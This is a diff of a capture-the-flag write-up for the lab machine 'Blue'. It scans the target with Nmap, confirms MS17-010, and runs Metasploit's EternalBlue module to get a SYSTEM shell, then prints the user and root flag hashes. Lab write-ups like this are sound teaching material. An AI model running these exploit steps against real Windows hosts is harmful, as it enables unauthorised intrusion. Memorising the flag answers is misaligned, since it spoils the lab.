@@ -1,9 +1,9 @@
 # Blue
 #### 10.10.10.40
 
-Let's run the normal nmap scan:
+Let's run the normal Nmap scan:
 ```{r, engine='bash', count_lines}
-nmap -sS -sV 10.10.10.40
+> nmap -sS -sV 10.10.10.40
 
 Nmap scan report for 10.10.10.40
 Host is up (0.16s latency).
@@ -23,9 +23,10 @@ Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 110.19 seconds
 ```
-We can see there is no webserver running, but there is smb on port 445, if we search up smb exploits we can see a new exploit called EternalBlue like the name of the machine, which was the exploit used in the infamous wannacry ransomware to distribute itself between windows machines, we can use nmap's "vuln" script to make sure its vulnerable:
+As we can see, there is no web-server running, but there is an SMB service on port 445. While researching smb exploits, I found a new exploit called "EternalBlue" (Note the name of the Machine), which was the exploit used in the distribution of the infamous Wannacry Ransomware to Windows Machines.
+Using Nmap's "vuln" script we can check if the Machine is vulnerable:
 ```{r, engine='bash', count_lines}
-nmap -p 445 --script vuln 10.10.10.40
+> nmap -p 445 --script vuln 10.10.10.40
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-04 06:09 EDT
 Pre-scan script results:
@@ -60,7 +61,7 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 49.28 seconds
 ```
-Great! nmap reported its vulnerable, so let's power on metasploit and see if we have any options:
+Great! Nmap reported the Machine is vulnerable, so let's power on Metasploit and see if we have any existing modules of the exploit:
 ```{r, engine='bash', count_lines}
 msf > search name:eternalblue type:exploit
 
@@ -71,7 +72,7 @@ Matching Modules
    ----                                      ---------------  ----     -----------
    exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
 ```
-lets use the exploit and see what options we need to set:
+Lets use the exploit we found and check what options are required:
 ```{r, engine='bash', count_lines}
 msf > use exploit/windows/smb/ms17_010_eternalblue
 msf exploit(ms17_010_eternalblue) > show options
@@ -92,12 +93,12 @@ Module options (exploit/windows/smb/ms17_010_eternalblue):
    VerifyArch          true             yes       Check if remote architecture matches exploit Target.
    VerifyTarget        true             yes       Check if remote OS matches exploit Target.
 ```
-So we'll set the RHOST to the appropriate ip (10.10.10.40):
+Setting RHOST to the appropriate IP (10.10.10.40):
 ```{r, engine='bash', count_lines}
 msf exploit(ms17_010_eternalblue) > set RHOST 10.10.10.40
 RHOST => 10.10.10.40
 ```
-and lets roll!
+And lets roll!
 ```{r, engine='bash', count_lines}
 msf exploit(ms17_010_eternalblue) > exploit
 
@@ -153,19 +154,19 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>
 ```
-and we have a shell! :D
+Ladies and Gentlmens; We have a Shell! :D
 ```{r, engine='dos', count_lines}
-C:\Windows\system32>whoami
+C:\Windows\system32> whoami
 whoami
 nt authority\system
 ```
-we can also see we already have root so no need to priv esc, so lets own the user and root:
+Noticing we already have root, I did not need to escalate my privileges, so lets own the user and the system:
 ```{r, engine='dos', count_lines}
-C:\Users\haris\Desktop>type user.txt.txt   
+C:\Users\haris\Desktop> type user.txt.txt   
 type user.txt.txt
 4c546aea7dbee75cbd71de245c8deea9
 
-C:\Users\Administrator\Desktop>type root.txt.txt
+C:\Users\Administrator\Desktop> type root.txt.txt
 type root.txt.txt
 ff548eb71e920ff6c08843ce9df4e717
 ```
